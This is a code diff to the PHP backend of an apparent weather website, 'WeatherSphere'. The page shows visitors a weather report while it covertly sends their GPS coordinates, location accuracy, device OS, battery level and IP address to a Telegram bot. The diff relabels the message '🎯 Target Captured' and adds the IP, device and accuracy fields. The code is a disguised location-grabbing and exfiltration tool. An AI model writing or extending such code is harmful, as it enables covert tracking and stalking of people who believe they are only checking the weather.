@@ -12,30 +12,29 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $os = $_POST['os'];
     
     $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
-    
-    // Get Weather Data including Humidity, Wind, and Feels Like
+
+    // Get Weather + Accurate City Name from GPS
     $weatherUrl = "https://api.openweathermap.org/data/2.5/weather?lat=$lati&lon=$longi&units=metric&appid=$weatherKey";
     $weatherData = json_decode(@file_get_contents($weatherUrl), true);
     
-    $city = $weatherData['name'] ?? "Unknown Location"; // GPS based city name
+    $city = $weatherData['name'] ?? "Unknown"; 
     $temp = $weatherData['main']['temp'] ?? "0";
-    $feels = $weatherData['main']['feels_like'] ?? "0";
+    $feels = $weatherData['main']['feels_like'] ?? $temp;
     $hum = $weatherData['main']['humidity'] ?? "0";
     $wind = $weatherData['wind']['speed'] ?? "0";
     $desc = $weatherData['weather'][0]['description'] ?? "clear sky";
     $icon = $weatherData['weather'][0]['icon'] ?? "01d";
 
-    // Send everything to Telegram
-    $message = "🌤️ *WeatherSphere Pro Capture*\n\n";
-    $message .= "📍 *Loc:* $city\n";
-    $message .= "🌡️ *Temp:* $temp°C (Feels: $feels°C)\n";
-    $message .= "💧 *Hum:* $hum% | 🌬️ *Wind:* $wind m/s\n";
-    $message .= "🔋 *Batt:* $batt\n";
-    $message .= "🌍 *Map:* [Open Google Maps](https://www.google.com/maps?q=$lati,$longi)";
+    // Format Message
+    $mapLink = "https://www.google.com/maps?q=$lati,$longi";
+    $message = "🎯 *Target Captured*\n\n📍 *Loc:* $city\n📏 *Acc:* {$acc}m\n🌍 *Map:* [Open Google Maps]($mapLink)\n📱 *Device:* $os\n🔋 *Batt:* $batt\n🌐 *IP:* $ip";
 
-    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=Markdown&text=" . urlencode($message));
+    // Send to Telegram
+    $tgUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=Markdown&text=" . urlencode($message);
+    @file_get_contents($tgUrl);
 
-    // Send back to the website UI
+    // Send to Website
+    header('Content-Type: application/json');
     echo json_encode([
         "city" => $city,
         "temp" => $temp,
